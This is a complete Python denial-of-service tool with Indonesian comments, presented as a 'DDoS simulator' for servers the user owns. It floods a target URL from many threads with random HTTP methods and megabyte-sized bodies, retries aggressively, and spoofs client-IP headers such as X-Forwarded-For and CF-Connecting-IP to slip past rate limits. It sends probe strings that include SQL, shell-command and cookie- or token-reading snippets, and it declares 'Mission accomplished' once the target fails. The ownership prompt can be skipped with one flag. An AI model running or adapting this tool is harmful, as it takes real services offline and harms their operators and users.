#!/usr/bin/env python3
"""
💥 DDoS SIMULATOR TOOL 💥
ULTRA-AGGRESSIVE SERVER STRESS TESTING

⚠️ PERINGATAN: HANYA UNTUK TESTING SERVER YANG ANDA MILIKI! ⚠️
⚠️ TOOL INI SANGAT AGRESIF DAN BISA MEMBUAT SERVER DOWN! ⚠️
"""

import requests
import time
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import argparse
import socket
import struct
import base64

class DDoSSimulator:
    """Ultra-aggressive DDoS simulator"""
    
    def __init__(self, target_url, max_workers=100):
        self.target_url = target_url
        self.max_workers = max_workers
        self.session = requests.Session()
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        self.running = True
        self.server_down = False
        
        # Setup session
        self._setup_session()
        
        # HTTP Methods untuk kombinasi
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE']
        
        # Payloads untuk POST/PUT requests
        self.payloads = self._generate_payloads()
    
    def _setup_session(self):
        """Setup session dengan ultra-aggressive headers"""
        # Extended User Agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'curl/7.88.1',
            'Wget/1.21.4',
            'python-requests/2.31.0',
            'Apache-HttpClient/4.5.13',
            'okhttp/4.9.3',
            'PostmanRuntime/7.28.4',
        ]
        
        # Ultra-aggressive headers
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Forwarded-For': self._generate_random_ip(),
            'X-Real-IP': self._generate_random_ip(),
            'CF-Connecting-IP': self._generate_random_ip(),
            'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']),
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Host': urlparse(self.target_url).netloc,
            'X-Forwarded-Port': '443',
            'X-Original-URL': '/',
            'X-Rewrite-URL': '/',
            'X-Custom-IP-Authorization': self._generate_random_ip(),
            'X-Forwarded-Server': 'proxy.example.com',
            'X-Forwarded-By': 'proxy.example.com',
            'X-Forwarded-For-Original': self._generate_random_ip(),
            'X-Client-IP': self._generate_random_ip(),
            'X-Remote-IP': self._generate_random_ip(),
            'X-Remote-Addr': self._generate_random_ip(),
            'X-ProxyUser-Ip': self._generate_random_ip(),
            'X-Proxy-Connection': 'keep-alive',
            'X-Proxy-Authenticate': 'Basic realm="Proxy Authentication Required"',
            'X-Proxy-Authorization': 'Basic ' + base64.b64encode(b'user:pass').decode(),
            'X-Proxy-User': 'admin',
            'X-Proxy-Pass': 'password',
        })
        
        # Setup ultra-aggressive retry strategy
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=15,
            backoff_factor=0.05,
            status_forcelist=[429, 500, 502, 503, 504, 403, 407, 408, 520, 521, 522, 523, 524, 525, 526, 527, 530],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST", "PUT", "DELETE", "PATCH", "TRACE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=500, pool_maxsize=500)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def _generate_random_ip(self):
        """Generate random IP address"""
        return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    
    def _generate_payloads(self):
        """Generate payloads untuk POST/PUT requests"""
        payloads = []
        
        # JSON payloads
        json_payloads = [
            {'data': 'A' * 1000},
            {'data': 'A' * 10000},
            {'data': 'A' * 100000},
            {'data': 'A' * 1000000},
            {'test': 'payload', 'size': 'large'},
            {'admin': True, 'user': 'admin', 'password': 'admin'},
            {'debug': True, 'verbose': True, 'trace': True},
            {'query': 'SELECT * FROM users', 'type': 'sql'},
            {'command': 'system', 'args': ['ls', '-la']},
            {'eval': 'console.log("test")', 'type': 'javascript'},
        ]
        
        # Form data payloads
        form_payloads = [
            {'username': 'admin', 'password': 'admin'},
            {'email': 'test@test.com', 'password': 'password'},
            {'data': 'A' * 1000},
            {'file': 'A' * 10000},
            {'query': 'SELECT * FROM users'},
            {'command': 'system'},
            {'eval': 'console.log("test")'},
        ]
        
        # Raw payloads
        raw_payloads = [
            'A' * 1000,
            'A' * 10000,
            'A' * 100000,
            'A' * 1000000,
            'SELECT * FROM users',
            'system("ls -la")',
            'console.log("test")',
            'eval("console.log(\'test\')")',
            'document.cookie',
            'localStorage.getItem("token")',
            'sessionStorage.getItem("user")',
            'XMLHttpRequest',
            'fetch("/api/users")',
            '$.ajax({url: "/api/users"})',
            'axios.get("/api/users")',
        ]
        
        payloads.extend(json_payloads)
        payloads.extend(form_payloads)
        payloads.extend(raw_payloads)
        
        return payloads
    
    def send_request(self, method, url, payload=None):
        """Send single request dengan method tertentu"""
        if not self.running:
            return None
            
        try:
            # Randomize headers
            self.session.headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ])
            
            self.session.headers['X-Forwarded-For'] = self._generate_random_ip()
            
            if method in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
                response = self.session.request(method, url, timeout=3, allow_redirects=True)
            else:
                # POST, PUT, DELETE, PATCH dengan payload
                if payload is None:
                    payload = random.choice(self.payloads)
                
                if isinstance(payload, dict):
                    response = self.session.request(method, url, json=payload, timeout=3, allow_redirects=True)
                else:
                    response = self.session.request(method, url, data=payload, timeout=3, allow_redirects=True)
            
            self.request_count += 1
            
            # Analyze response
            status = response.status_code
            content_length = len(response.content)
            
            if status == 200:
                self.success_count += 1
                print(f"✅ [{self.request_count}] {method} {url} - Status: {status} - Size: {content_length}")
                
            elif status in [403, 404, 500, 502, 503, 520, 521, 522, 523, 524]:
                self.failed_count += 1
                print(f"❌ [{self.request_count}] {method} {url} - Status: {status} - Size: {content_length}")
                
                # Check if server is down
                if status in [502, 503, 520, 521, 522, 523, 524]:
                    print(f"💥 SERVER DOWN DETECTED: {method} {url} - Status: {status}")
                    self.server_down = True
                    
            else:
                print(f"⚠️ [{self.request_count}] {method} {url} - Status: {status} - Size: {content_length}")
            
            return {
                'method': method,
                'url': url,
                'status': status,
                'size': content_length,
                'headers': dict(response.headers),
                'cookies': dict(response.cookies)
            }
            
        except Exception as e:
            self.failed_count += 1
            print(f"💥 [{self.request_count}] {method} {url} - Error: {str(e)}")
            
            # Check if server is down
            if 'Connection refused' in str(e) or 'timeout' in str(e).lower():
                print(f"💥 SERVER DOWN DETECTED: {method} {url} - Connection Error")
                self.server_down = True
            
            return None
    
    def ddos_worker(self, worker_id):
        """DDoS worker thread"""
        print(f"🚀 Worker {worker_id} started")
        
        while self.running and not self.server_down:
            try:
                # Random method dan payload
                method = random.choice(self.http_methods)
                payload = random.choice(self.payloads) if method not in ['GET', 'HEAD', 'OPTIONS', 'TRACE'] else None
                
                # Send request
                self.send_request(method, self.target_url, payload)
                
                # Small delay
                time.sleep(0.001)  # 1ms delay
                
            except Exception as e:
                print(f"💥 Worker {worker_id} error: {str(e)}")
                time.sleep(0.1)
        
        print(f"🛑 Worker {worker_id} stopped")
    
    def start_ddos_simulation(self):
        """Mulai DDoS simulation"""
        print(f"💥 Memulai DDoS SIMULATION pada: {self.target_url}")
        print(f"⚡ Max Workers: {self.max_workers}")
        print(f"🌐 HTTP Methods: {', '.join(self.http_methods)}")
        print(f"⏰ Tanpa batas waktu - Tekan Ctrl+C untuk stop")
        print("=" * 80)
        
        try:
            # Start workers
            threads = []
            for i in range(self.max_workers):
                thread = threading.Thread(target=self.ddos_worker, args=(i+1,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Monitor progress
            while self.running and not self.server_down:
                time.sleep(1)
                
                # Print stats setiap 5 detik
                if int(time.time() - self.start_time) % 5 == 0:
                    self.print_ddos_stats()
                
                # Check if server is down
                if self.server_down:
                    print("💥 SERVER DOWN CONFIRMED! Mission accomplished!")
                    break
                    
        except KeyboardInterrupt:
            print("\n⏹️ DDoS simulation dihentikan oleh user")
            self.running = False
        except Exception as e:
            print(f"❌ Error: {str(e)}")
            self.running = False
        finally:
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=1)
    
    def print_ddos_stats(self):
        """Print DDoS statistics"""
        elapsed_time = time.time() - self.start_time
        requests_per_second = self.request_count / elapsed_time if elapsed_time > 0 else 0
        
        print(f"\n💥 DDoS SIMULATION STATS")
        print(f"🔄 Requests: {self.request_count} | Success: {self.success_count} | Failed: {self.failed_count}")
        print(f"⚡ RPS: {requests_per_second:.2f}")
        print(f"💥 Server Down: {self.server_down}")
        print(f"⏱️ Elapsed: {elapsed_time:.1f}s | Running: {self.running}")
        print("-" * 80)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='💥 DDoS SIMULATOR TOOL 💥')
    parser.add_argument('url', help='Target URL (HANYA SERVER YANG ANDA MILIKI!)')
    parser.add_argument('--workers', type=int, default=100, help='Number of workers (default: 100)')
    parser.add_argument('--confirm', action='store_true', help='Confirm that you own this server')
    
    args = parser.parse_args()
    
    # Safety check
    if not args.confirm:
        print("⚠️  PERINGATAN KEAMANAN KRITIS ⚠️")
        print("=" * 60)
        print("Tool ini SANGAT AGRESIF dan bisa MEMBUAT SERVER DOWN!")
        print("HANYA gunakan pada server yang ANDA MILIKI!")
        print("JANGAN GUNAKAN pada website orang lain!")
        print("Ini bisa dianggap sebagai serangan DDoS!")
        print("=" * 60)
        print(f"Target: {args.url}")
        print("=" * 60)
        
        confirm = input("Apakah Anda yakin server ini MILIK ANDA? (yes/no): ")
        if confirm.lower() != 'yes':
            print("❌ DDoS simulation dibatalkan")
            return
        
        confirm2 = input("Apakah Anda yakin ingin membuat server DOWN? (yes/no): ")
        if confirm2.lower() != 'yes':
            print("❌ DDoS simulation dibatalkan")
            return
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
    
    # Start DDoS simulation
    simulator = DDoSSimulator(args.url, args.workers)
    
    try:
        simulator.start_ddos_simulation()
    except KeyboardInterrupt:
        print("\n⏹️ DDoS simulation dihentikan")
    finally:
        simulator.running = False
        simulator.print_ddos_stats()
        print("\n🏁 DDoS simulation selesai")

if __name__ == "__main__":
    main() 
